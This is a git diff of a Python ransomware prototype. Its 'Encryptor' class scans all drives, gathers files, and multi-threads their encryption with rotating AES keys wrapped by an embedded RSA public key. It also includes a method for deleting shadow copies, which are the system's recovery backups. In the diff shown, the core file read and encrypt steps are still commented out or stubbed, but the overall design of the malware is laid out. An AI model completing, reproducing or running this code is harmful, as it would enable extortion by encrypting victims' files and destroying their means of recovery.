@@ -3,6 +3,9 @@ import ctypes
 import concurrent.futures
 import subprocess
 import psutil
+import threading
+import os
+from keygen import *
 
 
 class Encryptor:
@@ -11,8 +14,6 @@ class Encryptor:
         self.public_key = public_key
         self.drives = []
         self.filepaths = []
-
-    
 
     def scan_drives(self):
         """
@@ -75,23 +76,32 @@ class Encryptor:
 
 
     def encrypt(self, files_list):
+        """
+        the encrypt function the threading calls
+        """
         counter = 10
+        encrypted_count = 0
         
         while files_list:
-            # Every 10 files encrypte generate a new key and footer 
-            if counter == 10:
-                symenc = Symmetric_encryption()
-                symenc.generate_key()
-                footer = self.generate_footer(symenc.iv, symenc.AES_key)
-                counter = 0
-
+            
             for filepath in files_list:
+                encrypted_count += 1
+                
+                # Every 10 files encrypte generate a new key and footer 
+                if counter == 10:
+                    print("[LOG] Generating AES key...")
+                    symenc = Symmetric_encryption()
+                    symenc.generate_key()
+                    footer = self.generate_footer(symenc.iv, symenc.AES_key)
+                    counter = 1
+
                 try:
-                    with open(filepath, 'rb') as f:  
-                        content = f.read()
+                    print(encrypted_count)
+                    #with open(filepath, 'rb') as f:  
+                     #   content = f.read()
                     
                     #encrypt content
-
+                    
                     #open new file with .ENC enxtension
                         #add encrypted content
                         #add footer
@@ -100,6 +110,7 @@ class Encryptor:
 
                 except:
                     pass
+        print(f"[LOG] {encrypted_count} files encrypted")
 
     def generate_footer(self, iv, AES_key):
         """
@@ -108,7 +119,8 @@ class Encryptor:
         
         #load in the public key
         keygen = Encryption("id:1")
-        keygen.public_key = self.public_key
+        keygen.load_public_key(self.public_key)
+
 
         #encrypt iv
         encrypted_iv = keygen.encrypt(iv)
@@ -119,6 +131,7 @@ class Encryptor:
         #create footer
         return f"{encrypted_iv} {encrypted_key}"
     
+    @staticmethod
     def determine_thread_count():
         """Determines optimal thread count based on system specs."""
         
@@ -148,7 +161,8 @@ class Encryptor:
         """
         a function which starts a thread for encrytion, it will spaw multiple threads
         """
-        threads = self.determine_thread_count()
+        #threads = self.determine_thread_count()
+        threads = 40
 
         #split list by amount of threads
 
@@ -165,9 +179,20 @@ class Encryptor:
             start = end  # Update start index for next chunk
 
         #call threads to encrypt and pass a section of the list
+        threads = []
+
+    # Maak een thread voor de split file list
+        for i, files in enumerate(result):
+            thread = threading.Thread(target=self.encrypt, args=(files,)) # call the encrypt method and start a thread
+            threads.append(thread)
+            thread.start()
+
+        # Wacht tot alle threads klaar zijn
+        for thread in threads:
+            thread.join()
 
 
-    def delete_shadow_copies():
+    def delete_shadow_copies(self):
         """
         a method that checks if there are shadow copies
         """
@@ -184,9 +209,17 @@ class Encryptor:
 
 
 if __name__ == "__main__":
-    encrypt = Encryptor("test")
+    encrypt = Encryptor("""
+-----BEGIN RSA PUBLIC KEY-----
+MIGJAoGBAI8yZ4Q9xdMh2whC4NxfLwUbGAO5oTR3P9151g7Vq78cAWP/o2fZmzhQ
+cLRr5QmcxQYK+oOxHPA/y4WftNyp9JibQk3v2NyFRp+CVXS6Ss9cLKFaEzHXe76Q
+airp+nJl+sZa48AN+DURb5qHGn7P5qLaK2Lhfb6qpbGTDuYo2vYZAgMBAAE=
+-----END RSA PUBLIC KEY-----
+
+    """)
     encrypt.scan_drives()
     encrypt.get_files()
+    encrypt.start_encryption_process()
 
 
     
